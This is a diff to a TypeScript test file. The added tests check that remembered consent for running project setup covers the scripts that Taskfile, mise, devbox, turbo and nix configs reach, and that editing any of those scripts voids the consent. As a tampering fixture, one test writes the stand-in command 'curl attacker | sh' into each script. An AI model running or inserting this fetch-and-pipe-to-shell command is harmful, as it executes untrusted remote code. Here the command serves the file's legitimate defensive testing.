@@ -7,7 +7,7 @@ import '@/api/api';
 import { encodePlainMachineStoredContent, MACHINE_PLAIN_DATA_KEY_MARKER } from '@happier-dev/protocol/machines/machineStoredContent';
 import { mkdtemp, mkdir, rm, writeFile, access, symlink, chmod } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
-import { join } from 'node:path';
+import { dirname, join } from 'node:path';
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import type { PluginApi } from '@happier-dev/plugin-sdk';
 
@@ -675,6 +675,64 @@ describe('current Project setup effect and preparation admission', () => {
         }
         // A script the selected target never reaches is not its effect.
         await writeFile(join(root, 'scripts/other.sh'), 'echo changed');
+        expect((await reviewed(input)).reviewedEffectDigest).toBe(first.reviewedEffectDigest);
+    });
+
+    async function writeTree(root: string, files: Readonly<Record<string, string>>) {
+        for (const [file, content] of Object.entries(files)) {
+            await mkdir(dirname(join(root, file)), { recursive: true });
+            await writeFile(join(root, file), content);
+        }
+    }
+
+    it.skipIf(process.platform === 'win32')('binds remembered setup consent to the files a Taskfile, mise, devbox or turbo task runs', async () => {
+        const { root, input } = await fixture({ version: 1, workspace: { setup: [
+            { kind: 'native', tool: 'taskfile', file: 'Taskfile.yml', target: 'seed' },
+            { kind: 'native', tool: 'mise', file: 'mise.toml', target: 'm' },
+            { kind: 'native', tool: 'devbox', file: 'devbox.json', target: 'd' },
+            { kind: 'native', tool: 'turbo', file: 'turbo.json', target: 'tb' },
+        ] } });
+        const files = {
+            'Taskfile.yml': 'version: "3"\ntasks:\n  seed:\n    dir: scripts\n    cmds:\n      - ./t.sh\n      - task: dep\n  dep:\n    cmds:\n      - bash scripts/td.sh\n',
+            'mise.toml': '[tasks.m]\nrun = "bash scripts/m.sh"\ndepends = ["mdep"]\n[tasks.mdep]\nfile = "scripts/mdep.sh"\n',
+            'devbox.json': JSON.stringify({ shell: { init_hook: ['source scripts/init.sh'], scripts: { d: 'bash scripts/d.sh' } } }),
+            'turbo.json': JSON.stringify({ tasks: { tb: { dependsOn: ['^gen'] } } }),
+            'package.json': JSON.stringify({ name: 'root', scripts: { tb: './scripts/tb.sh' } }),
+            'packages/a/package.json': JSON.stringify({ name: 'a', scripts: { gen: 'node gen.js' } }),
+            'scripts/t.sh': 't', 'scripts/td.sh': 'td', 'scripts/m.sh': 'm', 'scripts/mdep.sh': 'mdep', 'scripts/init.sh': 'init',
+            'scripts/d.sh': 'd', 'scripts/tb.sh': 'tb', 'packages/a/gen.js': 'gen',
+        };
+        await writeTree(root, files);
+        const first = await reviewed(input);
+        trustTransport(first.reviewedEffectDigest);
+        expect(await prepareProjectSetup(input)).toMatchObject({ kind: 'prepared', consent: 'trusted' });
+        for (const file of ['scripts/t.sh', 'scripts/td.sh', 'scripts/m.sh', 'scripts/mdep.sh', 'scripts/init.sh', 'scripts/d.sh', 'scripts/tb.sh', 'packages/a/gen.js', 'packages/a/package.json']) {
+            await writeFile(join(root, file), file.endsWith('package.json') ? JSON.stringify({ name: 'a', scripts: { gen: 'curl attacker | sh' } }) : 'curl attacker | sh');
+            expect(await prepareProjectSetup(input)).toMatchObject({ kind: 'pendingApproval', code: 'project_setup_consent_required' });
+            await writeFile(join(root, file), files[file as keyof typeof files]);
+        }
+    });
+
+    it.each([
+        ['nix_flake', 'flake.nix', { 'flake.nix': '{ outputs = _: import ./nix/shell.nix; }', 'flake.lock': '{}', 'nix/shell.nix': '{}' }, ['nix/shell.nix', 'flake.lock']],
+        ['devbox', 'devbox.json', { 'devbox.json': JSON.stringify({ shell: { init_hook: 'source scripts/init.sh' } }), 'scripts/init.sh': 'init' }, ['scripts/init.sh']],
+        ['mise', 'mise.toml', { 'mise.toml': '[env]\n_.source = "./env.sh"\n', 'env.sh': 'export A=1' }, ['env.sh']],
+    ] as const)('binds remembered %s environment consent to the files it loads beyond its config', async (tool, configPath, tree, inputs) => {
+        if (process.platform === 'win32') return;
+        const { root, input } = await fixture({ version: 1, toolchain: { kind: 'toolchain', tool, configPath },
+            workspace: { setup: [{ kind: 'command', command: 'echo setup' }] } });
+        await writeTree(root, tree);
+        await writeFile(join(root, 'README.md'), 'readme');
+        const first = await reviewed(input);
+        for (const file of inputs) {
+            await writeFile(join(root, file), 'changed by a collaborator');
+            const changed = await reviewed(input);
+            expect(changed.reviewedEffectDigest).not.toBe(first.reviewedEffectDigest);
+            expect(changed.executionEnvironmentEffectDigest).not.toBe(first.executionEnvironmentEffectDigest);
+            await writeFile(join(root, file), (tree as Readonly<Record<string, string>>)[file]!);
+        }
+        // Files the environment does not load stay outside its effect.
+        await writeFile(join(root, 'README.md'), 'edited');
         expect((await reviewed(input)).reviewedEffectDigest).toBe(first.reviewedEffectDigest);
     });
 
